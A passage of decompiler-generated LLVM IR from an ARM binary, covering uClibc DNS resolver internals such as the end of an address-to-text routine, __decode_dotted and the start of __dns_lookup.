  %v7_1d284 = icmp slt i32 %v1_1d27c, 8
  %v7_1d1cc = icmp eq i32 %v0_1d1cc.pre, -1
  store i1 %v7_1d1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d284, label %dec_label_pc_1d1cc, label %dec_label_pc_1d288

dec_label_pc_1d288:                               ; preds = %dec_label_pc_1d27c
  br i1 %v7_1d1cc, label %.thread2, label %dec_label_pc_1d290

dec_label_pc_1d290:                               ; preds = %dec_label_pc_1d288, %dec_label_pc_1d250
  %v3_1d29c = phi i32 [ %v3_1d1e829, %dec_label_pc_1d288 ], [ %v2_1d258, %dec_label_pc_1d250 ]
  %v0_1d290 = phi i32 [ %v0_1d1cc.pre, %dec_label_pc_1d288 ], [ %v0_1d290.pre, %dec_label_pc_1d250 ]
  %v1_1d290 = load i32, i32* @r7, align 4
  %v2_1d290 = add i32 %v1_1d290, %v0_1d290
  %v7_1d294 = icmp eq i32 %v2_1d290, 8
  store i1 %v7_1d294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d294, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1d290
  %v4_1d29c = inttoptr i32 %v3_1d29c to i8*
  store i8 58, i8* %v4_1d29c, align 1
  %v5_1d29c = load i32, i32* @r4, align 4
  %v6_1d29c = add i32 %v5_1d29c, 1
  store i32 %v6_1d29c, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1d290, %dec_label_pc_1d288, %bb58
  %v2_1d2a4 = phi i32 [ %v3_1d29c, %dec_label_pc_1d290 ], [ %v3_1d1e829, %dec_label_pc_1d288 ], [ %v6_1d29c, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1d2a4 = inttoptr i32 %v2_1d2a4 to i8*
  store i8 0, i8* %v3_1d2a4, align 1
  %v4_1d2a4 = load i32, i32* @r4, align 4
  %v5_1d2a4 = add i32 %v4_1d2a4, 1
  store i32 %v2_1d1b4, i32* @r1, align 4
  %v2_1d2ac = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1d2ac, i32* %r2.global-to-local, align 4
  %v2_1d2b0 = sub i32 %v5_1d2a4, %v2_1d1b4
  %v9_1d2b4 = icmp eq i32 %v2_1d2b0, %v2_1d2ac
  store i1 %v9_1d2b4, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1d2b0, %v2_1d2ac
  br i1 %tmp75, label %dec_label_pc_1d2bc, label %dec_label_pc_1d2d0

dec_label_pc_1d2bc:                               ; preds = %.thread2
  %v0_1d2bc = call i32 @__GI___errno_location()
  store i32 %v0_1d2bc, i32* %r0.global-to-local, align 4
  %v0_1d2c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1d2c4, i32* %r2.global-to-local, align 4
  %v2_1d2c8 = inttoptr i32 %v0_1d2bc to i32*
  store i32 28, i32* %v2_1d2c8, align 4
  %v0_1d2f0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d2f0

dec_label_pc_1d2d0:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1d2d4 = inttoptr i32 %arg3 to i8*
  %v3_1d2d4 = call i32 @strcpy(i8* %v2_1d2d4, i32 %v2_1d1b4)
  br label %dec_label_pc_1d2d8

dec_label_pc_1d2d8:                               ; preds = %dec_label_pc_1d0b8, %dec_label_pc_1d2d0
  %storemerge = phi i32 [ %v3_1d0c4, %dec_label_pc_1d0b8 ], [ %v3_1d2d4, %dec_label_pc_1d2d0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d2f0

dec_label_pc_1d2e0:                               ; preds = %dec_label_pc_1d0ac
  %v0_1d2e0 = call i32 @__GI___errno_location()
  store i32 %v0_1d2e0, i32* %r0.global-to-local, align 4
  %v2_1d2e8 = inttoptr i32 %v0_1d2e0 to i32*
  store i32 97, i32* %v2_1d2e8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d2f0

dec_label_pc_1d2f0:                               ; preds = %bb57, %dec_label_pc_1d2d8, %dec_label_pc_1d2bc, %dec_label_pc_1d2e0
  %v0_1d2f0 = phi i32 [ %v1_1d248, %bb57 ], [ %storemerge, %dec_label_pc_1d2d8 ], [ %v0_1d2f0.pre, %dec_label_pc_1d2bc ], [ 0, %dec_label_pc_1d2e0 ]
  store i32 %v0_1d2f0, i32* %r0.global-to-local, align 4
  store i32 %v6_1d088, i32* %r5.global-to-local, align 4
  ret i32 %v0_1d2f0

; uselistorder directives
  uselistorder i32 %v0_1d2f0, { 1, 0 }
  uselistorder i1 %v7_1d1cc, { 2, 0, 1 }
  uselistorder i32 %v0_1d1cc.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1d27c, { 0, 2, 1 }
  uselistorder i32 %v0_1d268, { 1, 0 }
  uselistorder i32 %v0_1d250, { 1, 0 }
  uselistorder i32 %v5_1d1fc, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_1d1d4, { 1, 0, 2 }
  uselistorder i32 %v2_1d1fc69, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1d1f871, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1d1cc68, { 1, 0 }
  uselistorder i32 %v2_1d1b4, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1d1c4, { 1, 0, 2 }
  uselistorder i1 %v7_1d1a0, { 1, 0 }
  uselistorder i32 %v0_1d1a0, { 1, 2, 0 }
  uselistorder i32 %v1_1d1c4.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1d198.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1d188, { 1, 0 }
  uselistorder i1 %v7_1d180, { 1, 0 }
  uselistorder i32 %v1_1d174, { 1, 0 }
  uselistorder i32 %v0_1d188, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1d19c, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1d13c, { 1, 0 }
  uselistorder i32 %v0_1d174, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1d158, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1d168, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1d0f8, { 1, 0, 2 }
  uselistorder i32 %v2_1d0e0, { 1, 0 }
  uselistorder i32 %v0_1d0f8, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1d0fc, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 22, 14, 15, 16, 17, 18, 23, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 8, 1, 0, 9, 7, 2, 3, 4 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d2f0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1d2d8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d27c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d1cc, { 1, 0 }
  uselistorder label %dec_label_pc_1d1a0._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d1a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d198, { 1, 0 }
  uselistorder label %dec_label_pc_1d174, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1d170, { 1, 0 }
  uselistorder label %dec_label_pc_1d128, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1d30c = load i32, i32* @r5, align 4
  %v0_1d310 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d310, i32* %sl.global-to-local, align 4
  %v2_1d310 = icmp eq i32 %v0_1d310, 0
  br i1 %v2_1d310, label %.thread30, label %dec_label_pc_1d338.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1d3f8

dec_label_pc_1d338.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1d3384 = load i32, i32* @r1, align 4
  %v6_1d33c14 = icmp slt i32 %v0_1d3384, %arg2
  br i1 %v6_1d33c14, label %dec_label_pc_1d340.preheader, label %dec_label_pc_1d3f8

dec_label_pc_1d340.preheader:                     ; preds = %dec_label_pc_1d338.preheader
  %v2_1d34051 = add i32 %v0_1d310, %v0_1d3384
  %v3_1d34052 = inttoptr i32 %v2_1d34051 to i8*
  %v4_1d34053 = load i8, i8* %v3_1d34052, align 1
  %v6_1d34054 = zext i8 %v4_1d34053 to i32
  store i32 %v6_1d34054, i32* @r4, align 4
  %v2_1d34455 = icmp eq i8 %v4_1d34053, 0
  br i1 %v2_1d34455, label %bb49, label %dec_label_pc_1d34c

dec_label_pc_1d334:                               ; preds = %bb48, %bb44
  %v1_1d338 = phi i32 [ %v1_1d338.pre, %bb48 ], [ %v1_1d36459, %bb44 ]
  %v0_1d338 = phi i32 [ %v0_1d338.pre, %bb48 ], [ %v5_1d37c, %bb44 ]
  %v0_1d334 = phi i32 [ %v0_1d334.pre, %bb48 ], [ %v0_1d38060, %bb44 ]
  store i32 %v0_1d334, i32* %r0.global-to-local, align 4
  %v6_1d33c = icmp slt i32 %v0_1d338, %v1_1d338
  br i1 %v6_1d33c, label %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge, label %dec_label_pc_1d3f8

dec_label_pc_1d334.dec_label_pc_1d340_crit_edge:  ; preds = %dec_label_pc_1d334
  %v0_1d340.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1d340 = add i32 %v0_1d340.pre, %v0_1d338
  %v3_1d340 = inttoptr i32 %v2_1d340 to i8*
  %v4_1d340 = load i8, i8* %v3_1d340, align 1
  %v6_1d340 = zext i8 %v4_1d340 to i32
  store i32 %v6_1d340, i32* @r4, align 4
  %v2_1d344 = icmp eq i8 %v4_1d340, 0
  %v0_1d3e4 = load i32, i32* @ip, align 4
  %v2_1d3e4 = icmp eq i32 %v0_1d3e4, 0
  br i1 %v2_1d344, label %dec_label_pc_1d3e4, label %dec_label_pc_1d34c

dec_label_pc_1d34c:                               ; preds = %dec_label_pc_1d340.preheader, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge
  %v2_1d3e466 = phi i1 [ %v2_1d3e4, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge ], [ false, %dec_label_pc_1d340.preheader ]
  %v0_1d3e464 = phi i32 [ %v0_1d3e4, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge ], [ 1, %dec_label_pc_1d340.preheader ]
  %v6_1d34063 = phi i32 [ %v6_1d340, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge ], [ %v6_1d34054, %dec_label_pc_1d340.preheader ]
  %v0_1d36c62 = phi i32 [ %v0_1d340.pre, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge ], [ %v0_1d310, %dec_label_pc_1d340.preheader ]
  %v0_1d35c61 = phi i32 [ %v0_1d338, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge ], [ %v0_1d3384, %dec_label_pc_1d340.preheader ]
  %v0_1d38060 = phi i32 [ %v0_1d334, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge ], [ 0, %dec_label_pc_1d340.preheader ]
  %v1_1d36459 = phi i32 [ %v1_1d338, %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge ], [ %arg2, %dec_label_pc_1d340.preheader ]
  %v1_1d350 = and i32 %v6_1d34063, 192
  br i1 %v2_1d3e466, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_1d34c
  %v1_1d354 = load i32, i32* %r8.global-to-local, align 4
  %v2_1d354 = add i32 %v1_1d354, 1
  store i32 %v2_1d354, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1d34c, %bb
  %v2_1d358 = icmp eq i32 %v1_1d350, 192
  %v1_1d35c = add i32 %v0_1d35c61, 1
  store i32 %v1_1d35c, i32* %r1.global-to-local, align 4
  br i1 %v2_1d358, label %dec_label_pc_1d364, label %dec_label_pc_1d38c

dec_label_pc_1d364:                               ; preds = %bb42
  %v6_1d368 = icmp slt i32 %v1_1d35c, %v1_1d36459
  br i1 %v6_1d368, label %dec_label_pc_1d36c, label %dec_label_pc_1d3f8

dec_label_pc_1d36c:                               ; preds = %dec_label_pc_1d364
  %v2_1d36c = add i32 %v1_1d35c, %v0_1d36c62
  %v3_1d36c = inttoptr i32 %v2_1d36c to i8*
  %v4_1d36c = load i8, i8* %v3_1d36c, align 1
  %v6_1d36c = zext i8 %v4_1d36c to i32
  %v1_1d374 = urem i32 %v6_1d34063, 64
  br i1 %v2_1d3e466, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1d36c
  %v1_1d378 = load i32, i32* %r8.global-to-local, align 4
  %v2_1d378 = add i32 %v1_1d378, 1
  store i32 %v2_1d378, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1d36c, %bb43
  %v4_1d37c = mul nuw nsw i32 %v1_1d374, 256
  %v5_1d37c = or i32 %v6_1d36c, %v4_1d37c
  store i32 %v5_1d37c, i32* %r1.global-to-local, align 4
  store i32 %v0_1d38060, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1d334

dec_label_pc_1d38c:                               ; preds = %bb42
  %v2_1d38c = add i32 %v6_1d34063, %v0_1d38060
  store i32 %v2_1d38c, i32* %r6.global-to-local, align 4
  %v3_1d390 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1d390, i32* @r3, align 4
  %v1_1d394 = add i32 %v2_1d38c, 1
  store i32 %v1_1d394, i32* %r7.global-to-local, align 4
  %v3_1d398 = icmp ult i32 %v1_1d394, %v3_1d390
  br i1 %v3_1d398, label %dec_label_pc_1d3a0, label %dec_label_pc_1d3f8

dec_label_pc_1d3a0:                               ; preds = %dec_label_pc_1d38c
  %v2_1d3a0 = add i32 %v6_1d34063, %v1_1d35c
  store i32 %v2_1d3a0, i32* @r5, align 4
  %v3_1d3a4 = icmp ult i32 %v2_1d3a0, %v1_1d36459
  br i1 %v3_1d3a4, label %dec_label_pc_1d3ac, label %dec_label_pc_1d3f8

dec_label_pc_1d3ac:                               ; preds = %dec_label_pc_1d3a0
  %v2_1d3ac = add i32 %v1_1d35c, %v0_1d36c62
  store i32 %v2_1d3ac, i32* @r1, align 4
  %v0_1d3b0 = load i32, i32* %sb.global-to-local, align 4
  %v2_1d3b0 = add i32 %v0_1d3b0, %v0_1d38060
  store i32 %v2_1d3b0, i32* @r0, align 4
  store i32 %v6_1d34063, i32* @r2, align 4
  %v0_1d3bc = call i32 @memcpy()
  store i32 %v0_1d3bc, i32* %r0.global-to-local, align 4
  store i32 %v0_1d3e464, i32* @ip, align 4
  %v0_1d3c4 = load i32, i32* %sl.global-to-local, align 4
  %v1_1d3c4 = load i32, i32* @r5, align 4
  %v2_1d3c4 = add i32 %v1_1d3c4, %v0_1d3c4
  %v3_1d3c4 = inttoptr i32 %v2_1d3c4 to i8*
  %v4_1d3c4 = load i8, i8* %v3_1d3c4, align 1
  br i1 %v2_1d3e466, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1d3ac
  %v1_1d3cc = load i32, i32* %r8.global-to-local, align 4
  %v2_1d3cc = load i32, i32* @r4, align 4
  %v3_1d3cc = add i32 %v2_1d3cc, %v1_1d3cc
  store i32 %v3_1d3cc, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1d3ac, %bb45
  %v2_1d3d0 = icmp eq i8 %v4_1d3c4, 0
  br i1 %v2_1d3d0, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1d3dc.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_1d3c4, i32* %r1.global-to-local, align 4
  %v2_1d3dc = load i32, i32* %sb.global-to-local, align 4
  %v3_1d3dc = load i32, i32* %r6.global-to-local, align 4
  %v4_1d3dc = add i32 %v3_1d3dc, %v2_1d3dc
  %v5_1d3dc = inttoptr i32 %v4_1d3dc to i8*
  store i8 %v0_1d3dc.off0, i8* %v5_1d3dc, align 1
  %v0_1d334.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1d338.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1d338.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1d334

dec_label_pc_1d3e4:                               ; preds = %dec_label_pc_1d334.dec_label_pc_1d340_crit_edge
  %v0_1d3ec.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1d3e4, label %dec_label_pc_1d3f8, label %bb49

bb49:                                             ; preds = %dec_label_pc_1d340.preheader, %dec_label_pc_1d3e4
  %v0_1d3ec.pre69 = phi i32 [ %v0_1d3ec.pre.pre, %dec_label_pc_1d3e4 ], [ 0, %dec_label_pc_1d340.preheader ]
  %v2_1d3e8 = add i32 %v0_1d3ec.pre69, 1
  store i32 %v2_1d3e8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1d3f8

dec_label_pc_1d3f8:                               ; preds = %dec_label_pc_1d3a0, %dec_label_pc_1d38c, %dec_label_pc_1d364, %dec_label_pc_1d334, %dec_label_pc_1d3e4, %dec_label_pc_1d338.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1d3e8, %bb49 ], [ -1, %dec_label_pc_1d338.preheader ], [ %v0_1d3ec.pre.pre, %dec_label_pc_1d3e4 ], [ -1, %dec_label_pc_1d38c ], [ -1, %dec_label_pc_1d3a0 ], [ -1, %dec_label_pc_1d334 ], [ -1, %dec_label_pc_1d364 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1d30c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1d3ec.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1d3c4, { 1, 0 }
  uselistorder i32 %v5_1d37c, { 1, 0 }
  uselistorder i32 %v1_1d35c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1d38060, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1d34063, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1d3e466, { 1, 2, 0 }
  uselistorder i32 %v0_1d310, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1d3f8, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_1d34c, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_1d404 = load i32, i32* @r4, align 4
  %v6_1d404 = load i32, i32* @r5, align 4
  %v9_1d404 = load i32, i32* @r6, align 4
  %v12_1d404 = load i32, i32* @r7, align 4
  %v15_1d404 = load i32, i32* @r8, align 4
  %v18_1d404 = load i32, i32* @sb, align 4
  %v21_1d404 = load i32, i32* @sl, align 4
  %v24_1d404 = load i32, i32* @fp, align 4
  %v27_1d404 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1d418 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d420 = call i32 @malloc(i32 512)
  store i32 %v1_1d420, i32* @sl, align 4
  %v0_1d428 = load i32, i32* @r4, align 4
  %v1_1d428 = inttoptr i32 %v0_1d428 to i8*
  %v3_1d42c = call i32 @strlen(i8* %v1_1d428)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1d438 = icmp ugt i32 %v3_1d42c, 893
  store i1 %v3_1d438, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_1d42c, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_1d458

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1db68

dec_label_pc_1d458:                               ; preds = %entry
  %v1_1d45c = add i32 %v3_1d42c, 130
  %v1_1d460 = call i32 @malloc(i32 %v1_1d45c)
  store i32 %v1_1d460, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d464 = icmp eq i32 %v1_1d460, 0
  br i1 %v2_1d464, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_1d458
  %v1_1d468 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1d468 = icmp eq i32 %v1_1d468, 0
  br i1 %v3_1d468, label %bb213, label %dec_label_pc_1d47c

.thread5:                                         ; preds = %dec_label_pc_1d458
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1db60

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1db60

dec_label_pc_1d47c:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1d47c = load i32, i32* @r4, align 4
  %v1_1d47c = inttoptr i32 %v0_1d47c to i8*
  %v2_1d47c = load i8, i8* %v1_1d47c, align 1
  %v3_1d47c = zext i8 %v2_1d47c to i32
  store i32 %v3_1d47c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d480 = icmp eq i8 %v2_1d47c, 0
  br i1 %v2_1d480, label %dec_label_pc_1db60, label %dec_label_pc_1d488

dec_label_pc_1d488:                               ; preds = %dec_label_pc_1d47c
  %v2_1d48c = add i32 %v0_1d47c, %v3_1d42c
  store i32 %v2_1d48c, i32* %r3.global-to-local, align 4
  %v1_1d490 = add i32 %v2_1d48c, -1
  %v2_1d490 = inttoptr i32 %v1_1d490 to i8*
  %v3_1d490 = load i8, i8* %v2_1d490, align 1
  %v4_1d490 = zext i8 %v3_1d490 to i32
  store i32 %v4_1d490, i32* @r3, align 4
  store i32 %v3_1d42c, i32* @r2, align 4
  store i32 %v0_1d47c, i32* @r1, align 4
  %v0_1d4a0 = call i32 @memcpy()
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 27352, i32* %ip.global-to-local, align 4
  store i32 26316, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1d51c = ptrtoint i32* %stack_var_-76 to i32
  %v2_1d634 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1d638 = ptrtoint i32* %stack_var_-88 to i32
  %v2_1d65c = ptrtoint i32* %stack_var_-192 to i32
  %v2_1d67c = bitcast i32* %stack_var_-192 to i8*
  %v2_1d730 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1d73c = ptrtoint i32* %stack_var_-56 to i32
  %v2_1d7c8 = icmp eq i32 %tmp161, 0
  %v1_1d7d4 = add i32 %tmp160, -2
  %v2_1d7d8 = icmp ne i32 %v1_1d7d4, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_1d8c4 = ptrtoint i32* %stack_var_-448 to i32
  %v2_1d8c8 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1db0c56 = icmp sgt i32 %tmp159, 0
  %v2_1da34 = icmp ne i32 %v0_1d418, 0
  %v7_1da34 = icmp eq i32 %v0_1d418, 1
  %v1_1d928 = bitcast i32* %stack_var_-448 to i8*
  %v2_1d9dc = icmp eq i32 %tmp144, 0
  %v2_1d7e4 = icmp ugt i8 %v3_1d490, 45
  %v7_1d7e4 = icmp eq i8 %v3_1d490, 46
  %v1_1d590 = add i32 %v1_1d460, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_1d570 = add i32 %v1_1d460, %v3_1d42c
  %v5_1d570 = inttoptr i32 %v4_1d570 to i8*
  %v1_1d7d4.cmp = icmp ugt i32 %v1_1d7d4, 1
  %v2_1d80c = icmp eq i32 %tmp160, 0
  %v3_1da38 = icmp ugt i32 %v0_1d418, 27
  %v8_1da38 = icmp eq i32 %v0_1d418, 28
  br label %dec_label_pc_1d500

dec_label_pc_1d500:                               ; preds = %dec_label_pc_1db48, %dec_label_pc_1d488
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1d488 ], [ %v1_1db4c, %dec_label_pc_1db48 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_1d488 ], [ %v3_1d614, %dec_label_pc_1db48 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1d488 ], [ %stack_var_-468.2, %dec_label_pc_1db48 ]
  %v1_1d508 = phi i32 [ -1, %dec_label_pc_1d488 ], [ %v3_1d6e8, %dec_label_pc_1db48 ]
  store i32 %v1_1d508, i32* %r3.global-to-local, align 4
  %v2_1d504 = icmp eq i32 %v1_1d508, -1
  store i1 %v2_1d504, i1* %cpsr_c.global-to-local, align 1
  %v7_1d504 = icmp eq i32 %v1_1d508, -1
  br i1 %v7_1d504, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_1d500
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_1d500, %bb215
  %v1_1d50c = xor i1 %v7_1d504, true
  call void @__pseudo_cond_branch(i1 %v1_1d50c, i32 ptrtoint (i32* @global_var_14378.1237 to i32))
  store i32 40, i32* @r7, align 4
  %v0_1d518 = load i32, i32* @r8, align 4
  %v2_1d518 = add i32 %v0_1d518, 44
  %v3_1d518 = inttoptr i32 %v2_1d518 to i32*
  %v4_1d518 = load i32, i32* %v3_1d518, align 4
  store i32 %v4_1d518, i32* @r4, align 4
  store i32 %v2_1d51c, i32* @r5, align 4
  store i32 80, i32* %ip.global-to-local, align 4
  %v2_1d528 = add i32 %v0_1d518, 40
  %v3_1d528 = inttoptr i32 %v2_1d528 to i32*
  %v4_1d528 = load i32, i32* %v3_1d528, align 4
  store i32 %v4_1d528, i32* %r1.global-to-local, align 4
  %v2_1d530 = add i32 %v0_1d518, 80
  %v3_1d530 = inttoptr i32 %v2_1d530 to i32*
  %v4_1d530 = load i32, i32* %v3_1d530, align 4
  store i32 %v4_1d530, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1d530)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_1d544 = load i32, i32* @r8, align 4
  %v2_1d544 = add i32 %v0_1d544, 20
  %v3_1d544 = inttoptr i32 %v2_1d544 to i32*
  %v4_1d544 = load i32, i32* %v3_1d544, align 4
  store i32 %v4_1d544, i32* %ip.global-to-local, align 4
  store i32 120144, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1d544)
  %v0_1d550 = call i32 @__open_nameservers()
  %v0_1d558 = load i32, i32* @r8, align 4
